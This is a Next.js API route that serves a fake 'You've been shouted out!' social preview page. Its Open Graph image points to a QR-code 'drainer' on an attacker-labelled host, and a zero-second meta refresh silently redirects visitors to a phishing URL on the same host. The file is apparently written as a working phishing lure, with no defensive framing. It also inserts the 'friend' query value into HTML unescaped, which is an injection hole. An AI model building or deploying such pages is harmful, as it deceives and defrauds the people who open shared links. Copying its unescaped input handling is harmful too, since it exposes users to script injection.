// pages/api/og-image.ts
import type { NextApiRequest, NextApiResponse } from 'next';

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  const { username, friend } = req.query;

  res.setHeader('Content-Type', 'text/html');
  res.status(200).send(`
    <html>
      <head>
        <meta property="og:title" content="You've been shouted out!" />
        <meta property="og:image" content="https://your-attacker-site.com/qr-code-drainer.png" />
        <meta http-equiv="refresh" content="0; url=https://your-attacker-site.com/phish" />
      </head>
      <body>
        <p>Loading shoutout for @${friend}...</p>
      </body>
    </html>
  `);
}
